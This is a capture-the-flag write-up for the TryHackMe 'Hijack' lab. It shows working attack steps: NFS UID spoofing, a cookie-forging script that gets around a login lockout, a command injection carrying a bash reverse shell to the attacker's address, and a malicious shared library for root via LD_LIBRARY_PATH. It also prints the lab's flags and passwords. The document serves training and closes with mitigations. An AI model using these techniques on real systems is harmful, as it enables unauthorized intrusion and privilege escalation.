# CTF Write-Up: [Hijack](https://tryhackme.com/room/hijack)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## Flags

<details>
<summary>User Flag</summary>

`THM{fdc8cd4cff2c19e0d1022e78481ddf36}`

</details>

<details>
<summary>Root Flag</summary>

`THM{b91ea3e8285157eaf173d88d0a73ed5a}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
2049/tcp open  nfs
```

### Detailed Nmap Scan

```
nmap -vv -oN Nmap/Detailed -p 21,22,80,111,2049 -A <IP_ADDRESS>
```

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.2p2 Ubuntu |
| 80 | HTTP | Apache 2.4.18 (Ubuntu) |
| 111 | rpcbind | 2-4 (RPC #100000) |
| 2049 | NFS | nfs_acl 2-3 |

Notable: HTTP cookie `httponly` flag is **not set**, and NFS port 2049 is open.

---

## 2. NFS Enumeration

```
showmount -e <IP_ADDRESS>
```

```
/mnt/share *
```

Mount the share:

```
mkdir share
sudo mount -t nfs <IP_ADDRESS>:/mnt/share share/
ls -lan
```

```
drwx------  2  1003  1003  4096 Aug 8 2023 share
```

Access denied — owned by UID 1003. Since NFS has no authentication, we impersonate the owner by creating a local user with the same UID:

```
sudo useradd fakeuser
sudo usermod -u 1003 fakeuser
sudo groupmod -g 1003 fakeuser
chmod o+x /path/to/working/directory
sudo su fakeuser
cat share/for_employees.txt
```

```
ftp creds :
ftpuser:W3stV1rg1n14M0un741nM4m4
```

---

## 3. FTP Enumeration

```
ftp <IP_ADDRESS>
# Login: ftpuser / W3stV1rg1n14M0un741nM4m4
ftp> mget .passwords_list.txt .from_admin.txt
```

`.from_admin.txt` reveals that `admin` is using a password from `.passwords_list.txt`, and that a login lockout is in place after 5 failed attempts.

---

## 4. Cookie Forgery — Admin Session Hijack

After registering an account and logging in, browser DevTools revealed the cookie format:

```
PHPSESSID = urlencode(base64(username:md5(password)))
```

Rather than brute-forcing the login form (which has a 5-attempt lockout), we forge cookies offline and test them directly against `administration.php` — completely bypassing the lockout.

> Script developed with the assistance of [Claude](https://claude.ai)

```
#!/usr/bin/env python3
"""
exploit.py - Hijack (TryHackMe)
Forges admin session cookie using a custom password list.
Cookie format: urlencode(base64(username:md5(password)))
Usage: python3 exploit.py <target_ip>
"""

import requests, hashlib, base64, urllib.parse, sys

TARGET   = f"http://{sys.argv[1]}/administration.php" if len(sys.argv) > 1 else "http://<IP_ADDRESS>/administration.php"
PASSFILE = ".passwords_list.txt"


def forge_cookie(username, password):
    md5 = hashlib.md5(password.encode()).hexdigest()
    b64 = base64.b64encode(f"{username}:{md5}".encode()).decode()
    return urllib.parse.quote(b64)


def main():
    print(f"[*] Target  : {TARGET}")
    print(f"[*] Wordlist: {PASSFILE}\n")

    try:
        with open(PASSFILE) as f:
            passwords = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        sys.exit(f"[!] '{PASSFILE}' not found.")

    print(f"[*] Loaded {len(passwords)} passwords")
    print(f"[*] Forging cookies for user: admin\n")

    for i, pwd in enumerate(passwords, 1):
        cookie = forge_cookie("admin", pwd)
        r = requests.get(TARGET, cookies={"PHPSESSID": cookie})
        if "access denied" not in r.text.lower():
            md5 = hashlib.md5(pwd.encode()).hexdigest()
            print(f"[+] Password     : {pwd}")
            print(f"[+] MD5 hash     : {md5}")
            print(f"[+] Cookie value : PHPSESSID={cookie}")
            print(f"\n[*] Access granted to {TARGET}")
            return
        print(f"[-] {i}/{len(passwords)} {pwd}", end="\r")

    print("\n[-] Password not found.")


if __name__ == "__main__":
    main()
```

```
python3 exploit.py <IP_ADDRESS>
```

```
[*] Loaded 150 passwords
[+] Password     : uDh3jCQsdcuLhjVkAy5x
[+] MD5 hash     : d6573ed739ae7fdfb3ced197d94820a5
[+] Cookie value : PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3D
[*] Access granted to http://<IP_ADDRESS>/administration.php
```

Set `PHPSESSID` in browser DevTools and refresh, admin panel unlocked.

---

## 5. Initial Access — Command Injection

The admin panel has a **Services Status Checker** that passes input to `systemctl`. The characters `;` and `|` are filtered but `&` is not.

```bash
nc -lvnp 4444
```

Submit as the service name:

```
apache2 & bash -c "bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1"
```

Shell as `www-data` received.

---

## 6. Lateral Movement — www-data to rick

```bash
cat /var/www/html/config.php
```

```php
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
```

SSH directly:

```bash
ssh rick@<IP_ADDRESS>
cat /home/rick/user.txt
```

> User flag: `THM{fdc8cd4cff2c19e0d1022e78481ddf36}`

---

## 7. Privilege Escalation — LD_LIBRARY_PATH Hijack

```bash
sudo -l
```

```
env_keep+=LD_LIBRARY_PATH
(root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

`LD_LIBRARY_PATH` is preserved when running sudo. We plant a malicious shared library in `/tmp` named after one of apache2's dependencies, then point `LD_LIBRARY_PATH` to `/tmp` so it loads our library as root.

```bash
# Find a target library
ldd /usr/sbin/apache2
# libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1

# Write malicious library
cat > /tmp/malicious.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/malicious.c

# Trigger
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

```
root@Hijack:/root# cat /root/root.txt
```

> Root flag: `THM{b91ea3e8285157eaf173d88d0a73ed5a}`

---

## 8. Attack Chain

```
Nmap Scan
    └─► NFS port 2049 open

NFS Enumeration (UID spoofing)
    └─► /mnt/share → for_employees.txt
    └─► FTP creds: ftpuser:W3stV1rg1n14M0un741nM4m4

FTP
    └─► .passwords_list.txt + .from_admin.txt

Cookie Analysis
    └─► Format: urlencode(base64(username:md5(password)))
    └─► Login lockout bypassed — cookies forged directly

exploit.py
    └─► admin password: uDh3jCQsdcuLhjVkAy5x
    └─► Admin session hijacked

Administration Panel
    └─► Command injection via & → reverse shell as www-data

config.php
    └─► rick:N3v3rG0nn4G1v3Y0uUp → SSH → user flag

LD_LIBRARY_PATH hijack
    └─► libcrypt.so.1 replaced → root shell → root flag
```

---

## 9. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---|---|---|
| 1 | NFS share world-accessible | UID spoofing → credential leak | Restrict exports to specific IPs; enable `root_squash` |
| 2 | Sensitive files on FTP | Password list and hints leaked | Remove unnecessary files; restrict FTP access |
| 3 | Credentials encoded in cookie | Session forgery, admin hijack | Use server-side sessions; never encode credentials client-side |
| 4 | Unsanitised input in service checker | Remote code execution | Whitelist service names; never pass user input to shell |
| 5 | Password reuse (DB password = SSH) | Lateral movement | Use unique passwords per service |
| 6 | sudo with env_keep+=LD_LIBRARY_PATH | Full root compromise | Remove LD_LIBRARY_PATH from env_keep; tighten sudo rules |

---

*Hijack — TryHackMe | Rooted*
